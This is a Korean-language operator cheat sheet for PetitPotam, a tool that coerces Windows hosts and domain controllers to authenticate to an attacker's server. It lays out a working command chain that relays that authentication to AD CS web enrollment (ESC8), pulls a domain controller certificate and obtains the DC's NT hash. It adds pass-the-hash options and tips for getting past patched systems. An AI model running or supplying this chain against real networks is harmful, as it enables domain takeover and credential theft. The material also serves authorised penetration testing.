# PetitPotam

- PetitPotam — MS-EFSRPC(EfsRpcOpenFileRaw 등) 호출로 Windows 호스트의 machine account 인증을 공격자 지정 서버로 강제하는 PoC 도구. DC를 인증 없이(null 세션) 트리거할 수 있다.
- ADCS CA가 있는 도메인에서 ESC8(웹 등록 릴레이)로 DC 인증서를 뽑아 도메인을 탈취할 때, NTLM 릴레이용 인증을 가장 빠르게 트리거할 때.
- impacket 필요, 인증을 받아줄 릴레이 서버(ntlmrelayx·certipy relay)가 먼저 떠 있어야 한다.

## 기본 사용

```bash
python3 PetitPotam.py <listenerIP> <targetIP>
python3 PetitPotam.py 10.10.10.100 10.10.10.1
```

- 인자 순서는 리스너 먼저, 타깃 나중에. DC는 자격증명 없이도 트리거가 통하는 경우가 대부분이다.

## 인증을 곁들인 사용

```bash
python3 PetitPotam.py -d corp.local -u user -p 'Password1' 10.10.10.100 10.10.10.1
python3 PetitPotam.py -d corp.local -u user -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' 10.10.10.100 10.10.10.1
```

## 주요 옵션

- `-d -u -p`: 도메인·계정·암호. 생략하면 null 세션으로 시도.
- `-hashes [LMHASH]:NTHASH`: NTLM 해시로 인증.
- `-pipe {efsr,lsarpc,samr,netlogon,lsass,all}`: 사용할 네임드 파이프. 기본은 lsarpc.
- `-target-ip <IP>`: 타깃 이름을 풀 수 없을 때 IP 직접 지정. `-dc-ip <IP>`: DC 지정.
- `-no-pass`, `-k`: Kerberos 인증(ccache) 사용.

## NTLM 릴레이 연계 흐름 (ADCS ESC8)

```bash
# 1. 릴레이 서버 준비 — CA(10.10.10.5) 웹 등록으로 릴레이
ntlmrelayx.py --target http://10.10.10.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# 또는 certipy relay 사용
certipy-ad relay -target 10.10.10.5 -template DomainController

# 2. 트리거 — DC(10.10.10.1)의 인증을 10.10.10.100으로 강제
python3 PetitPotam.py 10.10.10.100 10.10.10.1

# 3. 뽑힌 인증서로 인증 → DC NT 해시 획득
certipy-ad auth -pfx dc.pfx -dc-ip 10.10.10.1
```

- ADCS가 없으면 릴레이 방향을 RBCD(SMB·LDAP 릴레이 + --delegate-access)로 바꾼다.

## 팁·트러블슈팅

- 인증이 안 오면 `-pipe all`로 파이프를 바꿔가며 시험하고 타깃 445 인바운드를 확인.
- 릴레이가 거절되면 타깃의 SMB 서명 요구 여부를 확인하고 HTTP 릴레이(ESC8)로 전환.
- 최신 패치된 DC는 EfsRpcOpenFileRaw가 막혀 있을 수 있다. 이때는 Coercer의 MS-DFSNM·MS-RPRN 방법을 대신 시험.
- ntlmrelayx와 포트 충돌을 피하려면 445·80을 점유하는 Responder를 끄고 실행.
